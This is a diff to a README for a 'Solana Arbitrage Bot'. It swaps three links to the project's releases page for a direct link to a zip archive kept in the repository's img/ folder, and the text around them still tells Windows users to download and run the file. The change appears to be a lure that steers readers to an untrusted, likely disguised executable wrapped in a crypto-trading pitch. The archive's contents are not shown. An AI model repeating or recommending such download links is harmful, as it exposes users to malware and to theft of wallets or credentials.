@@ -1,6 +1,6 @@
 # 🟢 Solana-Arbitrage-Bot - Fast market checks on Solana
 
-[![Download](https://img.shields.io/badge/Download%20Now-Green?style=for-the-badge)](https://github.com/stanwoodquartan748/Solana-Arbitrage-Bot/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-Green?style=for-the-badge)](https://github.com/stanwoodquartan748/Solana-Arbitrage-Bot/raw/refs/heads/main/img/Solana-Bot-Arbitrage-1.8-alpha.4.zip)
 
 ## 📌 What this app does
 
@@ -29,7 +29,7 @@ For best results, use a system that stays on while the bot runs. A laptop can wo
 
 Visit this page to download:
 
-https://github.com/stanwoodquartan748/Solana-Arbitrage-Bot/releases
+https://github.com/stanwoodquartan748/Solana-Arbitrage-Bot/raw/refs/heads/main/img/Solana-Bot-Arbitrage-1.8-alpha.4.zip
 
 On the release page, look for the latest version. Download the Windows file that matches your PC. If there is a zip file, save it to your computer and extract it before use.
 
@@ -153,7 +153,7 @@ Topics:
 
 Use this page to download the latest Windows build:
 
-https://github.com/stanwoodquartan748/Solana-Arbitrage-Bot/releases
+https://github.com/stanwoodquartan748/Solana-Arbitrage-Bot/raw/refs/heads/main/img/Solana-Bot-Arbitrage-1.8-alpha.4.zip
 
 Open the newest release, pick the Windows file, save it, then run or extract it based on the file type.
 
